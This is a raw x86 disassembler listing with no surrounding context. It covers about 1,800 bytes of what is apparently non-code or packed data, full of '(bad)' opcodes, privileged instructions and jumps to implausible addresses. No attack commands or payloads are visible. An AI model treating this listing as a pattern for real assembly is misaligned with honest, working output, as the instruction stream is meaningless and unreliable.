  43127a:	call   0x45d0f57b
  43127f:	(bad)  
  431280:	out    dx,al
  431281:	(bad)  
  431282:	fisttp WORD PTR [eax+0x8801c7]
  431288:	jecxz  0x4312cf
  43128a:	call   0xe83f588e
  43128f:	lea    edi,[edi]
  431291:	(bad)  
  431292:	call   0xcb3d96
  431297:	add    DWORD PTR [ebx-0x7f570400],ecx
  43129d:	add    BYTE PTR [ecx],al
  43129f:	test   DWORD PTR [eax],eax
  4312a1:	wrmsr  
  4312a3:	jae    0x431292
  4312a5:	add    BYTE PTR [eax],al
  4312a7:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4312ad:	add    esp,edi
  4312af:	add    BYTE PTR [eax+0x450108],al
  4312b5:	mov    edi,DWORD PTR [ebp-0x6c]
  4312b8:	add    DWORD PTR [eax],0x4
  4312bb:	mov    eax,DWORD PTR [ebp+0x3]
  4312be:	mov    edi,DWORD PTR [esp+edi*8]
  4312c1:	dec    ebp
  4312c2:	nop
  4312c3:	mov    eax,DWORD PTR [ecx]
  4312c5:	fadd   DWORD PTR [eax]
  4312c7:	add    BYTE PTR [esi],al
  4312c9:	lea    eax,[eax]
  4312cb:	pusha  
  4312cc:	push   eax
  4312cd:	inc    DWORD PTR [ebp+0x52]
  4312d0:	call   DWORD PTR [ebp-0x7b]
  4312d3:	mov    esi,DWORD PTR [ebp-0x74]
  4312d6:	mov    eax,DWORD PTR [eax]
  4312d8:	cld    
  4312d9:	mov    eax,DWORD PTR [eax+0x880103]
  4312df:	add    BYTE PTR [ebp+0x6a],bh
  4312e2:	cmp    edi,0x10
  4312e5:	mov    WORD PTR [ebp+0x0],es
  4312e8:	mov    edx,DWORD PTR [edx-0x4]
  4312eb:	push   ecx
  4312ec:	nop
  4312ed:	inc    DWORD PTR [ecx]
  4312ef:	cld    
  4312f0:	add    BYTE PTR [ebp-0x24],bh
  4312f3:	mov    eax,DWORD PTR [eax]
  4312f5:	cld    
  4312f6:	push   eax
  4312f7:	nop
  4312f8:	inc    ebp
  4312f9:	add    edi,edi
  4312fb:	add    BYTE PTR [ebx+0x4de2f445],cl
  431301:	jmp    0xe33b:0x9403c733
  431308:	movntq QWORD PTR [esi],mm6
  43130b:	mov    DWORD PTR [eax],0xb87e8b98
  431311:	test   ebx,eax
  431313:	jmp    DWORD PTR [edi-0x1]
  431316:	int    0xe9
  431318:	sub    esp,esi
  43131a:	add    eax,DWORD PTR [ebp-0x30]
  43131d:	fild   WORD PTR [ebp+0x3f]
  431320:	cmp    eax,edi
  431322:	je     0xcc43f944
  431328:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  43132f:	(bad)  
  431330:	jne    0x4312be
  431332:	mov    ebx,ecx
  431334:	cld    
  431335:	jle    0x43137c
  431337:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  43133d:	inc    ebp
  43133e:	call   0xeb3cce
  431343:	add    BYTE PTR [ebx-0x7f170301],cl
  431349:	add    DWORD PTR es:[eax],eax
  43134c:	add    al,al
  43134e:	xor    BYTE PTR [eax+0x41],dl
  431351:	inc    ebp
  431352:	add    BYTE PTR [ebx+0xfcd88b],cl
  431358:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  43135e:	add    DWORD PTR [ecx+0x458be845],ecx
  431364:	fmul   DWORD PTR [ebx+0x8bb800]
  43136a:	cld    
  43136b:	call   0xd83e30
  431370:	dec    DWORD PTR [ebx+0x1090e8ff]
  431376:	add    al,al
  431378:	push   eax
  431379:	es inc ebp
  43137b:	inc    ebp
  43137c:	mov    ecx,DWORD PTR [ebx+0xd89c]
  431382:	dec    DWORD PTR [ebx-0x3ff70301]
  431388:	mov    DWORD PTR gs:[eax],eax
  43138b:	call   0x8b6b5950
  431390:	inc    ebp
  431391:	mov    eax,0xe8d8008b
  431396:	add    BYTE PTR [ecx],ch
  431398:	mov    eax,DWORD PTR [eax]
  43139a:	cld    
  43139b:	mov    eax,eax
  43139d:	call   0x462b23f7
  4313a2:	sub    DWORD PTR [ebx-0x3c743000],ecx
  4313a8:	cld    
  4313a9:	mov    BYTE PTR [eax+0x8401c1],0x1
  4313b0:	xor    BYTE PTR [eax],al
  4313b2:	push   edi
  4313b3:	inc    ebp
  4313b4:	mov    DWORD PTR [ebx],esi
  4313b6:	in     al,0xb9
  4313b8:	inc    ebp
  4313b9:	lea    ecx,[ebx-0x3c370301]
  4313bf:	dec    ebp
  4313c0:	cdq    
  4313c1:	mov    esi,DWORD PTR [edx]
  4313c3:	or     BYTE PTR [ebx],al
  4313c5:	ror    DWORD PTR [ebp-0xfebf79],0x0
  4313cc:	call   0x433d16
  4313d1:	add    BYTE PTR [ebx+0x75fcf4ff],cl
  4313d7:	jge    0x43140c
  4313d9:	mov    eax,DWORD PTR [ebx]
  4313db:	cld    
  4313dc:	lea    edx,[eax+0xff0120]
  4313e2:	call   0x433d76
  4313e7:	push   eax
  4313e8:	inc    DWORD PTR [ebp-0x1c]
  4313eb:	mov    ecx,DWORD PTR [ebp-0x58]
  4313ee:	xor    eax,DWORD PTR [eax]
  4313f0:	add    edi,edi
  4313f2:	cmp    ebp,eax
  4313f4:	jne    0x43141c
  4313f6:	mov    DWORD PTR [eax],0x8b004dd8
  4313fc:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  431403:	mov    eax,ebx
  431405:	cld    
  431406:	test   BYTE PTR [eax+0x320199],bh
  43140c:	mov    DWORD PTR [ebp+0x8],esi
  43140f:	xor    eax,DWORD PTR [ebp-0x73]
  431412:	test   DWORD PTR [esp+esi*2-0x1],edi
  431416:	mov    ebp,eax
  431418:	mov    eax,0x33004d29
  43141d:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  431423:	add    DWORD PTR [eax],eax
  431425:	add    BYTE PTR [ebp+0x30],al
  431428:	mov    edx,DWORD PTR [edi-0x48]
  43142b:	add    ebx,0xffffffe4
  43142e:	addr16 test ebp,ecx
  431431:	je     0x43145e
  431433:	mov    eax,DWORD PTR [ebx]
  431435:	cld    
  431436:	sar    BYTE PTR [eax+0x3b0145],1
  43143c:	pcmpeqw mm4,mm6
  43143f:	xor    edi,edi
  431441:	lea    ecx,[ebx-0x239c7470]
  431447:	add    BYTE PTR [ebp+0x50],cl
  43144a:	cmp    eax,DWORD PTR [ebp+0x75]
  43144d:	mov    ebp,DWORD PTR [eax-0x68]
  431450:	test   DWORD PTR [eax],eax
  431452:	clc    
  431453:	push   DWORD PTR [ebp-0x1]
  431456:	lea    ecx,[eax]
  431458:	int3   
  431459:	inc    ebp
  43145a:	call   0xfb44ea
  43145f:	jne    0x431459
  431461:	xor    edi,DWORD PTR [ebp-0x41]
  431464:	jmp    0x4314d8
  431466:	mov    eax,DWORD PTR [eax]
  431468:	mov    eax,0x339545c7
  43146d:	inc    DWORD PTR [ebx]
  43146f:	push   DWORD PTR [ecx]
  431471:	aaa    
  431472:	mov    eax,DWORD PTR [eax]
  431474:	jmp    0x4314c6
  431476:	mov    eax,DWORD PTR [ebp-0x3c]
  431479:	mov    eax,eax
  43147b:	cld    
  43147c:	clc    
  43147d:	ret    
  43147e:	test   bh,al
  431480:	pop    es
  431481:	xchg   ebp,eax
  431482:	add    bh,bh
  431484:	inc    ebp
  431485:	dec    DWORD PTR [edi]
  431487:	and    DWORD PTR [ebx],ebp
  431489:	add    BYTE PTR [eax],al
  43148b:	push   eax
  43148c:	jbe    0x4314e3
  43148e:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  431494:	or     al,0xcf
  431496:	inc    eax
  431497:	enter  0x745,0x72
  43149b:	inc    ebp
  43149c:	mov    eax,DWORD PTR [ecx]
  43149e:	int3   
  43149f:	add    BYTE PTR [ebp-0x75],al
  4314a2:	ss mov eax,0x33c74d9c
  4314a8:	ror    BYTE PTR [ebp+0x72f80885],1
  4314ae:	inc    ebp
  4314af:	add    BYTE PTR [ebx-0x3c7423bb],cl
  4314b5:	fadd   st,st(6)
  4314b7:	rol    BYTE PTR [ebp+0x12],0x8b
  4314bb:	inc    ebp
  4314bc:	fmul   QWORD PTR [ebx-0x3c39233d]
  4314c2:	inc    ebp
  4314c3:	test   bh,al
  4314c5:	cdq    
  4314c6:	clc    
  4314c7:	xor    al,BYTE PTR [ebp+0x45dcf889]
  4314cd:	inc    ebp
  4314ce:	cmp    BYTE PTR [ebx],dh
  4314d0:	pushf  
  4314d1:	mov    ecx,0xffb48dc7
  4314d6:	test   eax,ecx
  4314d8:	clc    
  4314d9:	dec    ebp
  4314da:	inc    ebp
  4314db:	mov    edi,DWORD PTR [edx]
  4314dd:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  4314e4:	test   edi,edi
  4314e6:	clc    
  4314e7:	test   DWORD PTR [ebp+0x45],0x89c8b3c
  4314ee:	(bad)  
  4314ef:	enter  0x18e8,0x85
  4314f3:	ss clc 
  4314f5:	pushf  
  4314f6:	inc    ebp
  4314f7:	dec    DWORD PTR [ebx-0x3cba0f04]
  4314fd:	push   eax
  4314fe:	xabort 0x7d
  431501:	add    BYTE PTR [ebx],bh
  431503:	mov    ecx,DWORD PTR [edi]
  431505:	mov    DWORD PTR [eax],ebx
  431507:	les    eax,FWORD PTR [eax]
  431509:	adc    ebp,ecx
  43150b:	dec    ebp
  43150c:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  431512:	mov    ecx,esi
  431514:	lock or al,cl
  431517:	clc    
  431518:	inc    ebp
  431519:	add    esi,DWORD PTR [ebx]
  43151b:	jge    0x431520
  43151d:	xor    edi,DWORD PTR [ebx]
  43151f:	cmp    ecx,DWORD PTR [edi]
  431521:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  431526:	mov    edi,DWORD PTR [ecx]
  431528:	test   al,0xcc
  43152a:	dec    ebp
  43152b:	test   BYTE PTR [ebx],dh
  43152d:	pop    es
  43152e:	xor    eax,DWORD PTR [eax]
  431530:	add    ecx,DWORD PTR [esi]
  431532:	add    ecx,eax
  431534:	psraw  mm0,mm1
  431537:	sub    BYTE PTR [ebp+0x38],cl
  43153a:	mov    edi,DWORD PTR [ebx]
  43153c:	lock int3 
  43153e:	shl    edx,1
  431540:	rol    BYTE PTR [ebp+0xc],1
  431543:	mov    DWORD PTR [ebp-0x24],0xf8038533
  43154a:	jmp    0x7c1594
  43154f:	pushf  
  431550:	inc    ebp
  431551:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  431557:	xor    ecx,ebx
  431559:	add    ecx,esi
  43155b:	mov    esi,eax
  43155d:	enter  0x45af,0x8b
  431561:	xor    ecx,eax
  431563:	add    edx,DWORD PTR [ebp-0x77]
  431566:	sub    ecx,DWORD PTR [eax]
  431568:	cmp    eax,DWORD PTR [ebp+0x77]
  43156b:	(bad)  
  43156c:	mov    ebx,DWORD PTR [eax+ebp*4+0xa889c7]
  431573:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  431579:	cmp    esi,DWORD PTR [ebx]
  43157b:	pushf  
  43157c:	xor    eax,edi
  43157e:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  431585:	inc    ebp
  431586:	dec    ebp
  431587:	cmp    eax,0xc7f09c8b
  43158c:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  431593:	inc    ebp
  431594:	jmp    0x4315d5
  431596:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43159d:	dec    ebp
  43159e:	xor    esi,DWORD PTR [ebx]
  4315a0:	add    eax,DWORD PTR [ebx]
  4315a2:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  4315a8:	dec    ebp
  4315a9:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  4315af:	out    dx,eax
  4315b0:	rol    BYTE PTR [eax],1
  4315b2:	add    eax,0xebc8458b
  4315b7:	dec    ebp
  4315b8:	mov    ebp,DWORD PTR [ebx]
  4315ba:	mov    esp,0x33f84d8b
  4315bf:	ret    
  4315c0:	xor    eax,esi
  4315c2:	add    ecx,eax
  4315c4:	add    eax,DWORD PTR [edx+0xc1010f]
  4315ca:	dec    ebp
  4315cb:	inc    ebp
  4315cc:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  4315d2:	ror    bl,1
  4315d4:	add    eax,0xebc645ce
  4315d9:	scas   eax,DWORD PTR es:[edi]
  4315da:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  4315e0:	xor    ebp,DWORD PTR [ebx]
  4315e2:	xor    edi,DWORD PTR [ebx]
  4315e4:	add    esi,DWORD PTR [edi+0x3]
  4315e7:	mov    ecx,DWORD PTR [edi]
  4315e9:	clc    
  4315ea:	rol    ebx,0x4d
  4315ed:	(bad)  
  4315ee:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  4315f5:	mov    ah,0x45
  4315f7:	dec    ebp
  4315f8:	jbe    0x43162d
  4315fa:	mov    esi,DWORD PTR [ebx]
  4315fc:	call   0x33466304
  431601:	rdpmc  
  431603:	rol    DWORD PTR [ebx],0x4d
  431606:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43160c:	inc    ebp
  43160d:	ror    BYTE PTR [ebx+0x45450808],1
  431613:	jmp    0x10b16a3
  431618:	inc    ebp
  431619:	inc    ebp
  43161a:	(bad)  
  43161b:	mov    ebx,eax
  43161d:	clc    
  43161e:	test   ebx,eax
  431620:	clc    
  431621:	retf   
  431622:	inc    ebp
  431623:	into   
  431624:	mov    esi,0x8b85afec
  43162a:	clc    
  43162b:	enter  0x5545,0x38
  43162f:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  431636:	ret    
  431637:	mov    ah,0xc6
  431639:	addr16 push 0x338b4545
  43163f:	clc    
  431640:	add    eax,ebx
  431642:	loopne 0x43160f
  431644:	dec    ebp
  431645:	into   
  431646:	mov    al,dh
  431648:	or     BYTE PTR [edi-0x37ff748e],ch
  43164e:	inc    ebp
  43164f:	push   ebp
  431650:	mov    ebp,DWORD PTR [ebx]
  431652:	in     al,dx
  431653:	cmp    eax,ebx
  431655:	ja     0x43169c
  431657:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  43165d:	inc    ebp
  43165e:	cdq    
  43165f:	mov    esi,DWORD PTR [edx]
  431661:	clc    
  431662:	mov    bl,al
  431664:	xlat   BYTE PTR ds:[ebx]
  431665:	retf   
  431666:	inc    ebp
  431667:	into   
  431668:	mov    eax,esi
  43166a:	in     al,dx
  43166b:	scas   eax,DWORD PTR es:[edi]
  43166c:	retf   
  43166d:	mov    ecx,DWORD PTR [ebp-0x38]
  431670:	mov    edx,DWORD PTR [ebp-0x24]
  431673:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8867]
  43167a:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  431681:	mov    eax,DWORD PTR [ebx]
  431683:	clc    
  431684:	loopne 0x431649
  431686:	push   ebp
  431687:	retf   
  431688:	mov    dh,al
  43168a:	adc    esi,ecx
  43168c:	jb     0x43163d
  43168e:	add    BYTE PTR [ebx+0x558bc845],cl
  431694:	in     al,dx
  431695:	sub    eax,ebx
  431697:	cmp    ecx,ebx
  431699:	mov    eax,esi
  43169b:	mov    esp,0x45af03ce
  4316a0:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  4316a6:	mov    eax,ebx
  4316a8:	in     al,dx
  4316a9:	into   
  4316aa:	dec    ebp
  4316ab:	(bad)  
  4316ac:	xor    ebp,DWORD PTR [edi+0x80f8903]
  4316b2:	rol    DWORD PTR [ebp+0x4d],0x89
  4316b6:	xor    esp,esp
  4316b8:	sub    eax,DWORD PTR [ebp-0x75]
  4316bb:	add    ebp,esp
  4316bd:	mov    al,0x55
  4316bf:	inc    ebp
  4316c0:	xor    esi,DWORD PTR [esi]
  4316c2:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  4316c9:	inc    ebp
  4316ca:	xor    edi,DWORD PTR [ecx]
  4316cc:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  4316d3:	test   DWORD PTR [eax],eax
  4316d5:	clc    
  4316d6:	enter  0x8645,0x33
  4316da:	inc    DWORD PTR [ebx]
  4316dc:	(bad)  
  4316dd:	jmp    0x431724
  4316df:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  4316e5:	inc    ebp
  4316e6:	(bad)  
  4316e7:	mov    ebp,DWORD PTR [edi-0x277b7424]
  4316ed:	cdq    
  4316ee:	retf   
  4316ef:	xor    al,cl
  4316f1:	mov    BYTE PTR [ebp+0xb],cl
  4316f4:	lea    eax,[ebp+0x8]
  4316f7:	xor    esi,DWORD PTR [edx+0x3]
  4316fa:	add    al,ah
  4316fc:	inc    ebp
  4316fd:	dec    ebp
  4316fe:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  431704:	addr16 add ch,cl
  431707:	inc    ebp
  431708:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  43170e:	inc    ebp
  43170f:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  431715:	push   ebp
  431716:	(bad)  
  431717:	mov    BYTE PTR [edi+0xf723b11],ch
  43171d:	add    ch,ch
  43171f:	inc    ebp
  431720:	dec    DWORD PTR [ebx-0x34332775]
  431726:	add    al,0x4d
  431728:	inc    ebp
  431729:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  43172f:	cdq    
  431730:	add    DWORD PTR [edx],esi
  431732:	add    BYTE PTR [ebx+0x4d00c000],cl
  431738:	push   DWORD PTR [ebx]
  43173a:	int3   
  43173b:	xor    eax,DWORD PTR [eax]
  43173d:	add    edx,DWORD PTR [eax+0x3]
  431740:	mov    DWORD PTR [edi],ecx
  431742:	call   0x4288d808
  431747:	mov    DWORD PTR [ebp-0x20],esp
  43174a:	add    BYTE PTR [ebp+0x7d],al
  43174d:	mov    eax,DWORD PTR [eax]
  43174f:	in     al,0x15
  431751:	ret    
  431752:	iret   
  431753:	(bad)  
  431754:	enter  0x14af,0x8b
  431758:	(bad)  
  431759:	in     al,dx
  43175a:	or     bl,cl
  43175c:	adc    cl,al
  43175e:	push   ebp
  43175f:	dec    ebp
  431760:	inc    eax
  431761:	mov    edx,DWORD PTR [ebp-0x20]
  431764:	jb     0x431731
  431766:	mov    ecx,esi
  431768:	cld    
  431769:	scas   eax,DWORD PTR es:[edi]
  43176a:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  431771:	mov    BYTE PTR [eax],0x8c
  431774:	push   0xffffff99
  431776:	push   edi
  431777:	xor    dl,BYTE PTR [eax+0x3b]
  43177a:	mov    ecx,DWORD PTR [edi]
  43177c:	call   0x8c425cdf
  431781:	mov    eax,eax
  431783:	in     al,dx
  431784:	jge    0x4317d3
  431786:	mov    DWORD PTR [ebx],esi
  431788:	int3   
  431789:	add    eax,DWORD PTR [ebp+0xf]
  43178c:	xor    eax,ecx
  43178e:	(bad)  
  43178f:	dec    ebp
  431790:	pushf  
  431791:	xor    ecx,esi
  431793:	add    edi,DWORD PTR [edi]
  431795:	mov    eax,DWORD PTR [ebp-0x38]
  431798:	(bad)  
  431799:	test   dh,dl
  43179b:	cdq    
  43179c:	add    esi,DWORD PTR [edx]
  43179e:	jmp    0x431729
  4317a0:	mov    cl,al
  4317a2:	add    eax,0x14330f45
  4317a7:	mov    ecx,0xff448d80
  4317ac:	jmp    0xc9902779
  4317b1:	mov    edx,ecx
  4317b3:	rol    BYTE PTR [ebp+0x330155],1
  4317b9:	add    ecx,DWORD PTR [ebp+0xf]
  4317bc:	xor    eax,edx
  4317be:	(bad)  
  4317bf:	ror    DWORD PTR [eax],0x86
  4317c2:	jb     0x4317c1
  4317c4:	add    bh,bh
  4317c6:	clc    
  4317c7:	inc    ebp
  4317c8:	jb     0x431834
  4317ca:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4317d0:	mov    ebx,DWORD PTR ss:[eax+ebx*8+0x68c000c7]
  4317d8:	ret    
  4317d9:	xor    al,bh
  4317db:	add    BYTE PTR [ebp+0x75],al
  4317de:	ss push 0xffffff9c
  4317e1:	inc    edi
  4317e3:	adc    al,0xe8
  4317e5:	inc    ebp
  4317e6:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4317ec:	mov    ecx,DWORD PTR [eax]
  4317ee:	cld    
  4317ef:	or     DWORD PTR [ebp-0x34],0x33
  4317f3:	jbe    0x4317f8
  4317f5:	mov    edx,DWORD PTR [ecx+0x2b]
  4317f8:	dec    ebp
  4317f9:	mov    cl,BYTE PTR [ebx+0x45d801]
  4317ff:	mov    BYTE PTR [ebx],dh
  431801:	mov    eax,DWORD PTR [ebx]
  431803:	or     BYTE PTR [ecx+0x3b],dl
  431806:	dec    ebp
  431807:	int3   
  431808:	xor    ebp,edi
  43180a:	add    eax,DWORD PTR [ebp+0x51]
  43180d:	mov    ecx,DWORD PTR [ebp-0x28]
  431810:	xor    eax,DWORD PTR [eax]
  431812:	add    ebp,DWORD PTR [eax+0x51]
  431815:	adc    BYTE PTR [eax+0x0],0x8b
  431819:	add    BYTE PTR [ebx+0x4d18fcff],cl
  43181f:	inc    ebp
  431820:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  431826:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43182c:	dec    ebp
  43182d:	mov    esi,DWORD PTR [ebx]
  43182f:	hlt    
  431830:	add    eax,ebx
  431832:	push   ecx
  431833:	inc    ebp
  431834:	dec    ebp
  431835:	(bad)  
  431836:	call   esi
  431838:	in     al,0xc7
  43183a:	retf   
  43183b:	mov    al,ds:0xc1ff39ce
  431840:	adc    al,0xc6
  431842:	inc    ebp
  431843:	and    eax,0x9c0f4c85
  431848:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  43184f:	cmp    BYTE PTR [ebx+0x3a],0x0
  431853:	mov    dh,0xc7
  431855:	cmp    eax,eax
  431857:	jne    0x454410a3
  43185d:	mov    edi,DWORD PTR [eax]
  43185f:	mov    eax,0x848bcb9c
  431864:	rcr    BYTE PTR [ecx-0x7c7fcd0f],0x67
  43186b:	or     BYTE PTR [edi],cl
  43186d:	(bad)  
  43186e:	dec    ebp
  43186f:	inc    edi
  431870:	add    bh,0x51
  431873:	or     cl,ch
  431875:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43187b:	xchg   DWORD PTR [eax-0x1638ae64],eax
  431881:	mov    esp,0xf802b588
  431886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431887:	inc    ebp
  431888:	(bad)  
  431889:	cmp    bh,bh
  43188b:	pushf  
  43188c:	or     DWORD PTR [ecx+0x45ffe474],0x0
  431893:	mov    ecx,DWORD PTR [ebp-0x340018]
  431899:	into   
  43189a:	dec    DWORD PTR [ebx-0x7f72431c]
  4318a0:	push   0x5000ff01
  4318a5:	retf   
  4318a6:	inc    ebp
  4318a7:	into   
  4318a8:	dec    DWORD PTR [ebx-0x343f3ff4]
  4318ae:	push   eax
  4318af:	into   
  4318b0:	call   0x4b1d40
  4318b5:	retf   
  4318b6:	add    dh,cl
  4318b8:	add    bh,bh
  4318ba:	mov    DWORD PTR [eax+ecx*1],edx
  4318bd:	clc    
  4318be:	inc    ebp
  4318bf:	inc    ebp
  4318c0:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4318c6:	push   0x1
  4318c8:	push   edi
  4318c9:	add    BYTE PTR [eax-0x35],dl
  4318cc:	mov    ecx,esi
  4318ce:	cld    
  4318cf:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4318d5:	into   
  4318d6:	ror    BYTE PTR [ebx+0x75000800],0x50
  4318dd:	xor    eax,DWORD PTR [ebp+0x3]
  4318e0:	jne    0x431933
  4318e2:	call   DWORD PTR [eax-0x3c]
  4318e5:	mov    DWORD PTR [ecx-0x18],edx
  4318e8:	mov    edi,edi
  4318ea:	call   0x8b465e73
  4318ef:	add    ah,ah
  4318f1:	rol    BYTE PTR [ebp-0x7c],0xeb
  4318f5:	add    edi,edi
  4318f7:	add    al,ch
  4318f9:	inc    ebp
  4318fa:	push   ecx
  4318fb:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  431901:	mov    al,0xc7
  431903:	test   esp,esp
  431905:	clc    
  431906:	test   DWORD PTR [ebp-0x8],ecx
  431909:	add    BYTE PTR [ebp+0x51],0x39
  43190d:	jmp    0x8bcca1ae
  431912:	in     al,dx
  431913:	or     BYTE PTR [ebp-0xf],al
  431916:	xor    eax,DWORD PTR [eax+0x4f896703]
  43191c:	hlt    
  43191d:	mov    eax,DWORD PTR [ebp-0x50]
  431920:	xor    esi,ecx
  431922:	add    eax,DWORD PTR [eax+0x4f086789]
  431928:	inc    ebp
  431929:	adc    esi,0x68
  43192c:	pushf  
  43192d:	inc    edi
  43192f:	add    al,ch
  431931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431932:	test   edi,edi
  431934:	clc    
  431935:	inc    DWORD PTR [ebp-0x73]
  431938:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  43193c:	(bad)  
  43193d:	push   ecx
  43193e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43193f:	jne    0x4318c6
  431941:	push   eax
  431942:	clc    
  431943:	test   DWORD PTR [ebp-0x1],eax
  431946:	cmp    eax,0xc78b9cff
  43194b:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  431952:	inc    ebp
  431953:	push   edi
  431954:	aas    
  431955:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  43195c:	dec    ebp
  43195d:	add    BYTE PTR [ebx],dh
  43195f:	inc    ebp
  431960:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  431966:	enter  0x8401,0x0
  43196a:	add    al,BYTE PTR [eax]
  43196c:	add    bh,bh
  43196e:	out    dx,eax
  43196f:	sbb    BYTE PTR [eax],al
  431971:	dec    ebp
  431972:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  431978:	sub    esi,DWORD PTR [ebx]
  43197a:	mov    ebp,DWORD PTR [eax-0x8]
  43197d:	add    bl,0x0
  431980:	(bad)  
  431981:	cmp    eax,ecx
  431983:	or     BYTE PTR [edx+0x750114],al
  431989:	inc    DWORD PTR [ebp+0x18]
  43198c:	mov    eax,DWORD PTR [ebp-0x8]
  43198f:	mov    ebx,eax
  431991:	(bad)  
  431992:	retf   
  431993:	inc    ebp
  431994:	into   
  431995:	mov    esi,eax
  431997:	int3   
  431998:	scas   eax,DWORD PTR es:[edi]
  431999:	push   es
  43199a:	mov    esi,DWORD PTR [ebp-0xc]
  43199d:	call   DWORD PTR [ebp+0x18]
  4319a0:	sub    edi,DWORD PTR [ebp+0x3b]
  4319a3:	mov    esi,DWORD PTR [edi-0x34]
  4319a6:	mov    eax,DWORD PTR [ebp-0x8]
  4319a9:	ss ret 
  4319ab:	pushf  
  4319ac:	mov    bh,0xbc
  4319af:	fadd   QWORD PTR [eax]
  4319b1:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  4319b7:	mov    esi,DWORD PTR [ebx]
  4319b9:	in     al,0x33
  4319bb:	ret    
  4319bc:	add    eax,esi
  4319be:	add    eax,DWORD PTR [ebp+0xf]
  4319c1:	mov    eax,ecx
  4319c3:	in     al,0x4d
  4319c5:	ret    
  4319c6:	mov    eax,esi
  4319c8:	in     al,dx
  4319c9:	inc    ebp
  4319ca:	rol    edi,1
  4319cc:	sar    al,1
  4319ce:	or     BYTE PTR [ebp+0x45e9f845],al
  4319d4:	add    BYTE PTR [eax],bh
  4319d6:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4319dd:	test   ebx,eax
  4319df:	clc    
  4319e0:	retf   
  4319e1:	inc    ebp
  4319e2:	into   
  4319e3:	cmp    al,dh
  4319e5:	pushf  
  4319e6:	scas   eax,DWORD PTR es:[edi]
  4319e7:	(bad)  
  4319e8:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4319ef:	inc    ebp
  4319f0:	cmp    edi,DWORD PTR [edi+esi*2]
  4319f3:	pushf  
  4319f4:	mov    eax,edi
  4319f6:	mov    esp,0x458567a8
  4319fb:	clc    
  4319fc:	mov    eax,DWORD PTR [ebp-0x8]
  4319ff:	mov    eax,ebx
  431a01:	in     al,dx
  431a02:	retf   
  431a03:	ret    
  431a04:	into   
  431a05:	mov    dh,0x7d
  431a08:	scas   eax,DWORD PTR es:[edi]
  431a09:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  431a0f:	add    BYTE PTR [ebx],ch
  431a11:	jmp    0xba1b51
  431a16:	mov    eax,DWORD PTR [ebp-0x5c]
  431a19:	mov    eax,DWORD PTR [ebp-0x14]
  431a1c:	inc    ebp
  431a1d:	enter  0x458b,0xf8
  431a21:	xor    eax,ebx
  431a23:	add    ecx,ebx
  431a25:	cmp    ecx,esi
  431a27:	shufps xmm7,xmm4,0xaf
  431a2b:	add    BYTE PTR [ebx+0x55e8f48b],cl
  431a31:	dec    ebp
  431a32:	sub    esi,DWORD PTR [ebx]
  431a34:	cmp    esi,DWORD PTR [ebx]
  431a36:	ja     0x431a3b
  431a38:	mov    eax,DWORD PTR [ebx]
  431a3a:	lods   al,BYTE PTR ds:[esi]
  431a3b:	mov    db0,ecx
  431a3e:	inc    ebp
  431a3f:	dec    ebp
  431a40:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  431a46:	retf   
  431a47:	rol    dh,1
  431a49:	or     al,0xce
  431a4b:	inc    ebp
  431a4c:	scas   eax,DWORD PTR es:[edi]
  431a4d:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  431a53:	add    BYTE PTR [ebx],ch
  431a55:	add    BYTE PTR [ebx],bh
  431a57:	inc    ebp
  431a58:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  431a5e:	inc    ebp
  431a5f:	retf   
  431a60:	mov    ecx,esi
  431a62:	clc    
  431a63:	(bad)  
  431a64:	retf   
